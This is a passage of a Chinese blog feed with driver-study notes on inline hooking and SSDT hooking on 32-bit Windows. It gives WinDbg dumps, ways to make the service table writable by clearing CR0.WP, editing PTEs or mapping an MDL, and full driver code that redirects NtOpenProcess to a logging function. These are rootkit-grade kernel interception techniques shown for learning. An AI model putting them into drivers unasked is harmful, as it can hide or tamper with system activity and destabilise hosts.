id="Inline-Hook"><a href="#Inline-Hook" class="headerlink" title="Inline Hook"></a>Inline Hook</h1><p>jmp 到没用的地方<br>pushad,pushfd,<br>做自己的事<br>popfd,popad.<br>加上被覆盖的代码<br>jmp 到被覆盖代码的下一行   </p><h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><p>位置的选择：</p><p><1> JMP/CALL指令至少占用5个字节</1></p><p><2> 绕开全局变量，因为全局变量的硬编码会随着指令变</2></p><p><3> 根据业务来决定在哪里HOOK：过滤参数？修改返回结果？</3></p><p>inline hook本质是改硬编码，改成<br>E9 +Code<br>Code = 要跳转的地址 - 补丁地址 - 5</p><p>比如从4183D7调到418221code就是285，采用小端存储就是<br>85 02 00 00</p><h1 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h1><p>[1]：滴水视频</p>]]></content>
      
      <categories>
          
          <category> 笔记 - 驱动笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 驱动 </tag>
            
            <tag> MDL </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SSDT—Hook和MDL</title>
      <link href="/2018/07/01/SSDT-Hook%E5%92%8CMDL/"/>
      <url>/2018/07/01/SSDT-Hook%E5%92%8CMDL/</url>
      <content type="html"><![CDATA[<h1 id="SSDT-HOOK"><a href="#SSDT-HOOK" class="headerlink" title="SSDT HOOK"></a>SSDT HOOK</h1><p>首先要明白SSDTHOOK就是自己再写一份函数，替换了SSDT表中的地址替换掉<br><img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/note/qudong/1.png" alt="SystemServiceTable系统服务表"></p><h2 id="如何访问系统服务表呢？"><a href="#如何访问系统服务表呢？" class="headerlink" title="如何访问系统服务表呢？"></a>如何访问系统服务表呢？</h2><p>SSDT  的全称是 System Services Descriptor Table，系统服务描述符表</p><p>下面这个是个全局变量<br>kd&gt; dd  KeServiceDescriptorTable(SSDT)</p><p>这个导出的 声明一下就可以使用了</p><p>kd&gt; dd  KeServiceDescriptorTableShadow(SSDT Shadow)</p><p>这个未导出 需要用其他的方式来查找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd KeServiceDescriptorTable</span><br><span class="line">83fac9c0  83ec0d9c 00000000 00000191 83ec13e4</span><br><span class="line">83fac9d0  00000000 00000000 00000000 00000000</span><br><span class="line">83fac9e0  83f1f6af 00000000 025355a9 000000bb</span><br><span class="line">83fac9f0  00000011 00000100 5385d2ba d717548f</span><br><span class="line">83faca00  83ec0d9c 00000000 00000191 83ec13e4</span><br><span class="line">83faca10  956d6000 00000000 00000339 956d702c</span><br><span class="line">83faca20  00000000 00000000 83faca24 00000340</span><br><span class="line">83faca30  00000340 865fab00 00000007 00000000</span><br></pre></td></tr></table></figure><p>其中83ec0d9c是函数地址，00000191是函数个数，83ec13e4是函数参数个数，单位是一个字节，除以4就是函数地址表上对应函数的个数，第一个函数对第一个个数。</p><h2 id="下面就是函数地址表"><a href="#下面就是函数地址表" class="headerlink" title="下面就是函数地址表"></a>下面就是函数地址表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd 83ec0d9c</span><br><span class="line">83ec0d9c  840bcc28 83f0340d 8404cb68 83e6788a</span><br><span class="line">83ec0dac  840be4ff 83f403fa 8412eb05 8412eb4e</span><br><span class="line">83ec0dbc  840413bd 84148368 841495c1 84037b95</span><br><span class="line">83ec0dcc  840c8b35 84121963 84074a56 840446cc</span><br><span class="line">83ec0ddc  83fda928 84113898 8402b14e 8406da62</span><br><span class="line">83ec0dec  840b9df1 8401b238 840b91fe 84038c0c</span><br><span class="line">83ec0dfc  840ca5bc 8403b28f 840ca39c 840c2afc</span><br><span class="line">83ec0e0c  8404d0f0 8410e657 840bfec9 840ca7ee</span><br><span class="line"></span><br><span class="line">根据这个定义一个结构体</span><br><span class="line">//下面这个是系统服务表的结构体</span><br><span class="line">typedef struct _KSYSTEM_SERVICE_TABLE  </span><br><span class="line">&#123;  </span><br><span class="line">    PULONG  ServiceTableBase;                               // 服务函数地址表基址  </span><br><span class="line">    PULONG  ServiceCounterTableBase;                            </span><br><span class="line">    ULONG   NumberOfService;                                // 服务函数的个数  </span><br><span class="line">    PULONG   ParamTableBase;                                // 服务函数参数表基址   </span><br><span class="line">&#125; KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE;</span><br></pre></td></tr></table></figure><h2 id="下面就是函数参数个数表除四就是真正个数"><a href="#下面就是函数参数个数表除四就是真正个数" class="headerlink" title="下面就是函数参数个数表除四就是真正个数"></a>下面就是函数参数个数表除四就是真正个数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">kd&gt; db 83ec13e4</span><br><span class="line">83ec13e4  18 20 2c 2c 40 2c 40 44-0c 08 08 18 18 08 04 04  . ,,@,@D........</span><br><span class="line">83ec13f4  0c 0c 10 18 24 0c 2c 0c-18 10 0c 0c 0c 0c 0c 0c  ....$.,.........</span><br><span class="line">83ec1404  08 0c 18 18 14 18 0c 20-10 08 08 08 0c 08 0c 0c  ....... ........</span><br><span class="line">83ec1414  08 04 04 0c 08 08 08 08-0c 04 04 20 08 10 0c 20  ........... ... </span><br><span class="line">83ec1424  14 0c 2c 10 0c 0c 1c 10-20 20 10 38 10 14 10 20  ..,.....  .8... </span><br><span class="line">83ec1434  24 24 28 1c 1c 14 10 20-2c 10 34 28 18 2c 14 28  $$(.... ,.4(.,.(</span><br><span class="line">83ec1444  08 0c 08 04 04 04 04 04-0c 04 08 28 00 04 04 1c  ...........(....</span><br><span class="line">83ec1454  18 00 08 08 18 0c 14 18-08 18 0c 08 08 0c 04 00  ................</span><br></pre></td></tr></table></figure><h2 id="如何得到函数表地址"><a href="#如何得到函数表地址" class="headerlink" title="如何得到函数表地址"></a>如何得到函数表地址</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//这个就是SSDT的结构体，即系统服务描述表，里面就是多个系统服务表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSERVICE_TABLE_DESCRIPTOR</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">    KSYSTEM_SERVICE_TABLE   ntoskrnl;                       <span class="comment">// ntoskrnl.exe 的服务函数  </span></span><br><span class="line">    KSYSTEM_SERVICE_TABLE   win32k;                         <span class="comment">// win32k.sys 的服务函数(GDI32.dll/User32.dll 的内核支持)  </span></span><br><span class="line">    KSYSTEM_SERVICE_TABLE   notUsed1;  </span><br><span class="line">    KSYSTEM_SERVICE_TABLE   notUsed2;  </span><br><span class="line">&#125;KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>//导出由 ntoskrnl（10-10-12）所导出的 SSDT<br>extern PKSERVICE_TABLE_DESCRIPTOR    KeServiceDescriptorTable;   </p><p>//这个是导出的，要到内核文件找，所以名字不能瞎起</p><p>下面的代码是查看到SSDT表地址的代码，可以打印显示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;ntddk.h&gt;</span><br><span class="line">#include&lt;ntstatus.h&gt;</span><br><span class="line"></span><br><span class="line">typedef struct _KSYSTEM_SERVICE_TABLE</span><br><span class="line">&#123;</span><br><span class="line">PULONG  ServiceTableBase;                               // 服务函数地址表基址  </span><br><span class="line">PULONG  ServiceCounterTableBase;</span><br><span class="line">ULONG   NumberOfService;                                // 服务函数的个数  </span><br><span class="line">PULONG   ParamTableBase;                                // 服务函数参数表基址   </span><br><span class="line">&#125; KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE;</span><br><span class="line"></span><br><span class="line">typedef struct _KSERVICE_TABLE_DESCRIPTOR</span><br><span class="line">&#123;</span><br><span class="line">KSYSTEM_SERVICE_TABLE   ntoskrnl;                       // ntoskrnl.exe 的服务函数  </span><br><span class="line">KSYSTEM_SERVICE_TABLE   win32k;                         // win32k.sys 的服务函数(GDI32.dll/User32.dll 的内核支持)  </span><br><span class="line">KSYSTEM_SERVICE_TABLE   notUsed1;</span><br><span class="line">KSYSTEM_SERVICE_TABLE   notUsed2;</span><br><span class="line">&#125;KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//导出由 ntoskrnl所导出的 SSDT</span><br><span class="line">extern PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable;//这个是导出的，要到内核文件找，所以名字不能瞎起</span><br><span class="line"></span><br><span class="line">VOID DriverUnload(PDRIVER_OBJECT pDriver) &#123;</span><br><span class="line">UNREFERENCED_PARAMETER(pDriver);</span><br><span class="line">KdPrint((&quot;My Dirver is unloading...&quot;));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pPath) &#123;</span><br><span class="line">UNREFERENCED_PARAMETER(pPath);</span><br><span class="line">KdPrint((&quot;-&gt;%x \n&quot;, KeServiceDescriptorTable));</span><br><span class="line">pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">return STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="通过页表基址修改页属性"><a href="#通过页表基址修改页属性" class="headerlink" title="通过页表基址修改页属性"></a>通过页表基址修改页属性</h2><p>SSDT所在的物理页是只读的，如果要修改，先要修改页属性为可写：</p><p>1、第一种办法，用我们学过的知识，通过页表基址直接修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">if(RCR4 &amp; 0x00000020)</span><br><span class="line">&#123;//说明是2-9-9-12分页</span><br><span class="line">KdPrint((&quot;2-9-9-12分页 %p\n&quot;,RCR4));</span><br><span class="line">KdPrint((&quot;PTE1 %p\n&quot;,*(DWORD*)(0xC0000000 + ((HookFunAddr &gt;&gt; 9) &amp; 0x007FFFF8))));</span><br><span class="line">*(DWORD64*)(0xC0000000 + ((HookFunAddr &gt;&gt; 9) &amp; 0x007FFFF8)) |= 0x02; </span><br><span class="line">KdPrint((&quot;PTE1 %p\n&quot;,*(DWORD*)(0xC0000000 + ((HookFunAddr &gt;&gt; 9) &amp; 0x007FFFF8))));</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;//说明是10-10-12分页</span><br><span class="line">KdPrint((&quot;10-10-12分页\n&quot;));</span><br><span class="line">KdPrint((&quot;PTE1 %p\n&quot;,*(DWORD*)(0xC0000000 + ((HookFunAddr &gt;&gt; 10) &amp; 0x003FFFFC))));</span><br><span class="line">*(DWORD*)(0xC0000000 + ((HookFunAddr &gt;&gt; 10) &amp; 0x003FFFFC)) |= 0x02;</span><br><span class="line">KdPrint((&quot;PTE2 %p\n&quot;,*(DWORD*)(0xC0000000 + ((HookFunAddr &gt;&gt; 10) &amp; 0x003FFFFC))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="通过修改CR0寄存器（WP位置改成0）"><a href="#通过修改CR0寄存器（WP位置改成0）" class="headerlink" title="通过修改CR0寄存器（WP位置改成0）"></a>通过修改CR0寄存器（WP位置改成0）</h2><p><img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/note/qudong/2.png" alt="CR0寄存器">  </p><p>比如我们要SSDTHOOKNtOpenProcess，就要先通过IDA找到kernelBase的OpenProcess，在经过一系列查看最后在ntdll里找到ZWOpenProcess，所在位置看到了NtOpenProcess</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:77F05D88                 mov     eax, 0BEh       ; NtOpenProcess</span><br><span class="line">.text:77F05D8D                 mov     edx, 7FFE0300h</span><br><span class="line">.text:77F05D92                 call    dword ptr [edx]</span><br><span class="line">.text:77F05D94                 retn    10h</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd KeServiceDescriptorTable</span><br><span class="line">83f789c0  83e8cd9c 00000000 00000191 83e8d3e4</span><br><span class="line">83f789d0  00000000 00000000 00000000 00000000</span><br><span class="line">83f789e0  83eeb6af 00000000 025355a9 000000bb</span><br><span class="line">83f789f0  00000011 00000100 5385d2ba d717548f</span><br><span class="line">83f78a00  83e8cd9c 00000000 00000191 83e8d3e4</span><br><span class="line">83f78a10  95d46000 00000000 00000339 95d4702c</span><br><span class="line">83f78a20  00000000 00000000 83f78a24 00000340</span><br><span class="line">83f78a30  00000340 865fab00 00000007 00000000</span><br><span class="line">kd&gt; dd 83e8cd9c+4*BE</span><br><span class="line">83e8d094  840219dc 84073fff 84061b37 83f8d0c7</span><br><span class="line">83e8d0a4  84079674 83ff50c6 84096977 8405db6f</span><br><span class="line">83e8d0b4  8406dd87 840882e4 84061c4e 84119e0f</span><br><span class="line">83e8d0c4  841026f1 84103989 83ff3506 84050970</span><br><span class="line">83e8d0d4  841022a2 84101fc2 8410235a 8410207a</span><br><span class="line">83e8d0e4  8400693f 83fd5f60 83ff0a51 841040e4</span><br><span class="line">83e8d0f4  841041aa 84052403 840a35a7 840679a1</span><br><span class="line">83e8d104  84114a3e 84114e83 83ed2d34 84086b8c</span><br><span class="line">kd&gt; u 840219dc </span><br><span class="line">nt!NtOpenProcess:</span><br><span class="line">840219dc 8bff            mov     edi,edi</span><br><span class="line">840219de 55              push    ebp</span><br><span class="line">840219df 8bec            mov     ebp,esp</span><br><span class="line">840219e1 51              push    ecx</span><br><span class="line">840219e2 51              push    ecx</span><br><span class="line">840219e3 64a124010000    mov     eax,dword ptr fs:[00000124h]</span><br><span class="line">840219e9 8a803a010000    mov     al,byte ptr [eax+13Ah]</span><br><span class="line">840219ef 8b4d14          mov     ecx,dword ptr [ebp+14h]</span><br></pre></td></tr></table></figure><p>下面说一下通过MDL修改页属性。<br>就是 Memory Descriptor List，简称 MDL。有的同学可能会问了，MDL究竟是个什么东西呢？从字面意思看，不难理解，内存描述符列表。MDL包含了内存区域的起始、拥有者proc、字节数、标记等。OK，我们需要先定义一个MDL的指针。   </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PMDL MDLSystemCall;</span><br></pre></td></tr></table></figure><p>定义了MDL的指针以后，我们要通过MAPPED系列的参数来使内存拥有可写性，然后锁定内存中的MDL，那么我们就要定义一个PVOID的指针，来供MmMap操作。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PVOID *MappedSCT;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MDLSystemCall = MmCreateMdl(</span><br><span class="line">NULL, //内存描述符列表</span><br><span class="line">KeServiceDescriptorTable.ServiceTableBase,//</span><br><span class="line">内存地址</span><br><span class="line">KeServiceDescriptorTable.NumberOfServices*4);//内存长度</span><br><span class="line">if(!MDLSystemCall)</span><br><span class="line">  return STATUS_UNSUCCESSFUL;</span><br></pre></td></tr></table></figure><p>建立了MDL，填充一下页数组   </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MmBuildMdlForNonPagedPool(MDLSystemCall);//建立内存页的MDL描述   </span><br><span class="line">MDLSystemCall-&gt;MdlFlags = MDLSystemCall-&gt;MdlFlags | MDL_MAPPED_TO_SYSTEM_VA; //设置MDL标记为可写</span><br><span class="line">MappedSCT = MmMapLockedPages(MDLSystemCall, KernelMode);</span><br></pre></td></tr></table></figure><p>然后做自己的操作，比如这里的Hook</p><p>然后另外还有释放MDL的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(MDSystemCall)</span><br><span class="line">   &#123;</span><br><span class="line">      MmUnmapLockedPages(MappedSCT, MDSystemCall);</span><br><span class="line">      IoFreeMdl(MDSystemCall);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>下面是SSDT-Hook代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;ntddk.h&gt;</span><br><span class="line">#include&lt;ntstatus.h&gt;</span><br><span class="line">//1.找到系统服务表的函数地址表</span><br><span class="line">//定义一个全局变量用来存放之前的NtOpenProcess地址</span><br><span class="line">ULONG uOldNtOpenProcess;</span><br><span class="line">//有了地址还需要一个函数NtOpenProcess指针，用于调用原来的NtOpenProcess</span><br><span class="line"></span><br><span class="line">//定义修复和恢复页属性的函数</span><br><span class="line">PMDL MDSystemCall;</span><br><span class="line">PVOID *MappedSCT;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">typedef NTSTATUS(*NTOPENPROCESS)(</span><br><span class="line">__out PHANDLE  ProcessHandle,</span><br><span class="line">__in ACCESS_MASK  DesiredAccess,</span><br><span class="line">__in POBJECT_ATTRIBUTES  ObjectAttributes,</span><br><span class="line">__in_opt PCLIENT_ID  ClientId</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">typedef struct _KSYSTEM_SERVICE_TABLE</span><br><span class="line">&#123;</span><br><span class="line">PULONG  ServiceTableBase;                               // 服务函数地址表基址  </span><br><span class="line">PULONG  ServiceCounterTableBase;</span><br><span class="line">ULONG   NumberOfService;                                // 服务函数的个数  </span><br><span class="line">PULONG   ParamTableBase;                                // 服务函数参数表基址   </span><br><span class="line">&#125; KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE;</span><br><span class="line"></span><br><span class="line">typedef struct _KSERVICE_TABLE_DESCRIPTOR</span><br><span class="line">&#123;</span><br><span class="line">KSYSTEM_SERVICE_TABLE   ntoskrnl;                       // ntoskrnl.exe 的服务函数  </span><br><span class="line">KSYSTEM_SERVICE_TABLE   win32k;                         // win32k.sys 的服务函数(GDI32.dll/User32.dll 的内核支持)  </span><br><span class="line">KSYSTEM_SERVICE_TABLE   notUsed1;</span><br><span class="line">KSYSTEM_SERVICE_TABLE   notUsed2;</span><br><span class="line">&#125;KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//导出由 ntoskrnl所导出的 SSDT</span><br><span class="line">extern PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable;//这个是导出的，要到内核文件找，所以名字不能瞎起</span><br><span class="line"></span><br><span class="line">//准备用于替换的函数</span><br><span class="line">NTSTATUS NTAPI MyNtOpenProcess(__out PHANDLE  ProcessHandle,</span><br><span class="line">__in ACCESS_MASK  DesiredAccess,</span><br><span class="line">__in POBJECT_ATTRIBUTES  ObjectAttributes,</span><br><span class="line">__in_opt PCLIENT_ID  ClientId</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">NTSTATUS Status;</span><br><span class="line">Status = STATUS_SUCCESS;</span><br><span class="line">//这里填自己的业务。。。各种过滤，修改返回结构等</span><br><span class="line">KdPrint((&quot;MyNtOpenProcess %x %x %x %x \n&quot;, ProcessHandle, DesiredAccess, ObjectAttributes, ClientId));</span><br><span class="line">//后面这里填的是打开原来的函数，因为这个函数也要实现原来的功能，不然就乱套了，除非你自己在自己业务里实现了</span><br><span class="line">return ((NTOPENPROCESS)uOldNtOpenProcess)(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void PageProtectOff() &#123;</span><br><span class="line"></span><br><span class="line">//MDSystemCall = MmCreateMdl(NULL, KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase, KeServiceDescriptorTable-&gt;ntoskrnl.NumberOfService * 4);</span><br><span class="line">//if (!MDSystemCall)</span><br><span class="line">////return STATUS_UNSUCCESSFUL;</span><br><span class="line">//return;</span><br><span class="line">//MmBuildMdlForNonPagedPool(MDSystemCall);</span><br><span class="line">//MDSystemCall-&gt;MdlFlags = MDSystemCall-&gt;MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;</span><br><span class="line">//MappedSCT = MmMapLockedPages(MDSystemCall, KernelMode);</span><br><span class="line">__asm &#123; //关闭内存保护</span><br><span class="line">push eax;</span><br><span class="line">mov eax, cr0;</span><br><span class="line">and eax, ~0x10000;</span><br><span class="line">mov cr0, eax;</span><br><span class="line">pop eax;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void PageProtectOn() &#123;</span><br><span class="line">////解锁、释放MDL</span><br><span class="line">//if (MDSystemCall)</span><br><span class="line">//&#123;</span><br><span class="line">//MmUnmapLockedPages(MappedSCT, MDSystemCall);</span><br><span class="line">//IoFreeMdl(MDSystemCall);</span><br><span class="line">//&#125;</span><br><span class="line">__asm &#123; //恢复内存保护</span><br><span class="line">push eax;</span><br><span class="line">mov eax, cr0;</span><br><span class="line">or eax, 0x10000;</span><br><span class="line">mov cr0, eax;</span><br><span class="line">pop eax;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">//3.修改函数地址,准备个函数用来修改函数地址</span><br><span class="line">void HookNtOpenProcess() &#123;</span><br><span class="line">NTSTATUS Status;</span><br><span class="line">Status = STATUS_SUCCESS;</span><br><span class="line">PageProtectOff();</span><br><span class="line">uOldNtOpenProcess = KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[0xBE];</span><br><span class="line">KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[0xBE] = (ULONG)MyNtOpenProcess;</span><br><span class="line">PageProtectOn();</span><br><span class="line">&#125;</span><br><span class="line">//4.恢复</span><br><span class="line">void UnHookNtOpenProcess() &#123;</span><br><span class="line">PageProtectOff();</span><br><span class="line">KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[0xBE] = (ULONG)uOldNtOpenProcess;</span><br><span class="line">PageProtectOn();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID DriverUnload(PDRIVER_OBJECT pDriver) &#123;</span><br><span class="line">UNREFERENCED_PARAMETER(pDriver);</span><br><span class="line">UnHookNtOpenProcess();</span><br><span class="line"></span><br><span class="line">KdPrint((&quot;My Dirver is unloading...&quot;));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pPath) &#123;</span><br><span class="line">UNREFERENCED_PARAMETER(pPath);</span><br><span class="line">KdPrint((&quot;-&gt;%x \n&quot;, KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[0xBE]));//得到函数地址表</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HookNtOpenProcess();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">return STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后操作时可以用PChunt观察HOOk前后这个函数地址变化</p><p>这是hook前<img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E9%A9%B1%E5%8A%A8/3.png?x-oss-process=style/yangruiqi.com" alt="image"></p><p>这是Hook后<br><img 